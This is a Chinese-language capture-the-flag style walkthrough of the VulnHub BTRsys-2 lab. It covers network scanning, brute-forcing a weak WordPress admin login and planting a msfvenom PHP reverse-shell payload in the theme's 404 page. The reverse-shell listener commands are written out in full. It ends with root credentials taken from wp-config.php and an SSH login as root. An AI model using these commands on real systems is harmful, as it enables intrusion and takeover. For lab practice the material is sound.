BTRsys-2靶场实战记录

前言

靶场下载地址：https://www.vulnhub.com/entry/btrsys-v21,196/
本次靶场为BTRsys-2，其实还有一个类似靶场叫BTRsys-1，主要渗透思路都差不多，大家有兴趣的可以自行尝试。

一、信息收集

1.主机探测

首先你的虚拟机中要有一台kali机，还有刚刚下载的目标靶机。最好把kali机放在目标靶机同一网段下，这样方便进行端口扫描。

在kali机中输入：netdiscover -r 目标主机所在网段

2.资产扫描

在kali机中输入：nmap -sV 目标IP -v
参数:-s 探测服务 -V 服务的版本 -v显示详细过程

根据图片中的信息发现目标主机的80端口是开启的，我们可以尝试用浏览器访问IP。

3.目录扫描

网站是一张蛇的动图，我们尝试进行目录扫描寻找其他可访问的网站。
目录扫描可以用kali机中的dirbuster或者使用御剑工具。凭个人喜好自行选择。

这里展示kali机中的dirbuster

在kali机中输入：dirb http://目标IP/

重点关注划线的网址，别的网站并没有什么有利信息。

访问robots.txt

发现允许访问的还是/wordpress/

滑到底部找到login.php进行访问，接下来我们会对该登陆界面进行渗透。

二、漏洞利用

1. 暴力破解

这种登陆界面对表单内容没有严格的过滤验证，所以可以利用字典进行暴力破解。

打开burpsuite工具抓取登录数据包

添加两个payload位置，使用集束炸弹模式进行字典爆破。

可以很轻松的发现这里其实是一个弱口令
账户：admin
密码：admin
然后我们就可以登录进入wordpress后台。

2. 生成木马并利用

wordpress可以在404页面写入木马，这里我使用msfvenom工具指令生成一个PHP格式的反向TCP后门木马

指令：msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP地址 lport=端口号 -f raw -o /shell.php

成功生成木马文件后，我们把木马里的PHP代码复制到404页面，并保存

之后我们就可以去kali机上进行监听，使用命令msfconsole
msf > use exploit/multi/handler
msf > set payload php/meterpreter/reverse_tcp
msf > set lhost kali机IP
msf > set lport 端口号
msf > run

开启完监听，我们打开浏览器，访问以下地址

http://靶机IP/wordpress/wp-content/themes/twentyfourteen/404.php

访问后成功反弹meterpreter

三、提权

到了这一步之后有多种方法可以使用，比如利用系统层面的nday漏洞进行利用，这里我使用的方法是利用php的配置文件进行提权。

1. 通过配置文件提权

输入shell进入cmd

优化界面:python3 -c ‘import pty; pty.spawn(“/bin/bash”)’

接下来我们反复使用 cd.. 和 ls 命令 寻找wp-config.php文件
找到文件后，使用 cat 命令查看文件内容

可以获取到如下信息：
用户root
密码rootpassword!

输入mysql -u root -p
进入数据库


输入show databases;
显示数据库列表

输入use wordpress;
输入show tables;
显示数据库表

输入select * from wp-users;
显示用户信息

这样我们就得到了用户信息，我们可以将上面的密码放入在线网站解密在线MD5解密

接下来我们用root用户进行ssh连接，成功提权！

四、总结与经验

总的来说这是一个简易好上手的综合靶场，相比于sqli-labs、皮卡丘这类单一靶场，它能够很好的锻炼我们的综合能力，训练我们的渗透思路。下面是我在靶场练习过程中的一些错误点，希望对你们有所帮助。

1.kali机和靶机最好不要使用NAT模式连接网络，这样可能会导致反向连接木马无法回连，kali机监听不到。我推荐使用桥接模式，记得勾选复制物理机网络状态。

2.输入shell后界面是没有光标的，一定要用优化代码，不然无法进入后续的mysql。
